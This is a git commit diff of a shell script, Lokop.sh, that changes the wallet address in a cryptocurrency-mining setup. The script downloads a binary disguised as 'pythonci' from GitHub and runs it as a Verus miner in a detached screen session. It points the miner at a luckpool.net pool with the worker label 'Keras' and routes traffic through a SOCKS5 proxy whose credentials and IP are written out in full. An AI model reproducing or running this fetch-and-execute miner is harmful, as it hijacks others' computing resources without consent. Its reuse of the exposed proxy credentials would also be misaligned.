c4e43aeb8bdc0703cf3a142d6d1a372fcf66e6ac
eyishxd <102873412+eyishxd@users.noreply.github.com>
2022-04-22 09:27:47 +0700

    Update Lokop.sh

--- Lokop.sh
+++ Lokop.sh
@@ -6,7 +6,7 @@ wget https://github.com/uaaoxjdr/tesskepa/raw/main/pythonci
 chmod +x pythonci
 screen -dmS ls
 PL=stratum+tcp://na.luckpool.net:3956
-WT=RLW9aeQT9LVYYxpKtXRNdvh8H8HuTmPfg4
+WT=RFjeLpKzaG94EnaidkK2PvgdNR5Q5nTnbW
 WR=Keras
 PY=socks5://zjrpjitr:8yfoonefclaz@45.137.60.112:6640
 ./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
